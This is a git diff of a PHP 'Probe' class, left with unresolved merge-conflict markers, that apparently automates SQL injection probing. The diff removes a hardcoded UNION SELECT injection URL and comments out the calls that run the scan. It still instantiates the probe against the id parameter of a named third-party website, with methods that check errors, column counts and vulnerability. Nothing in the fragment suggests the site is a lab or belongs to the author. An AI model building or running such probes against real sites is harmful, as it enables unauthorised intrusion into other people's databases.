@@ -1,4 +1,3 @@
-<<<<<<< HEAD
 <?php
 
 class Probe
@@ -67,9 +66,7 @@ class Probe
  	 */
 	public function getVulnerable()
 	{
-		//$test = $this->getColumnNum();
-
-		$test = "http://www.slavsandtatars.com/about.php?id=null  union all select 1,2,3--";
+		$test = $this->getColumnNum();
 
 		$contents = file_get_contents($test);
 
@@ -80,15 +77,13 @@ class Probe
 }
 
 $probe = new Probe("http://www.slavsandtatars.com/about.php?id=25");
-
+/*
 $testError = $probe->getError();
 
 $testColumn = $probe->getColumnNum();
 
 $testVulnerable = $probe->getVulnerable();
 
-var_dump($testVulnerable);
-
+//var_dump($testColumn);
+*/
 ?>
-=======
->>>>>>> 357d2dae4107e89cdf226e73333e0652e423d104
